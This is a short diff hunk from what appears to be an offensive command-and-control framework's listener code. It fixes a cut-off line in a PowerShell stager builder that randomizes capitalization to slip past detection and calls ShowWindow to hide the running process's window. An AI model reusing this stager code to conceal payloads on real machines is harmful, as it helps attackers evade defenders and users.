@@ -132,7 +132,7 @@ class Listener:
                         stager += helpers.randomize_capitalization('"user32.dll"')
                         stager += ")] public static extern bool ShowWindow"
                         stager += "(int handle, int state);'; "
-                        stager += helpers.randomize_capitalization("add-type -name win -member $t -namespace$
+                        stager += helpers.randomize_capitalization("add-type -name win -member $t -namespace native;")
                         stager += " [native.win]::"
                         stager += "ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() "
                         stager += "| Get-Process).MainWindowHandle, 0);"
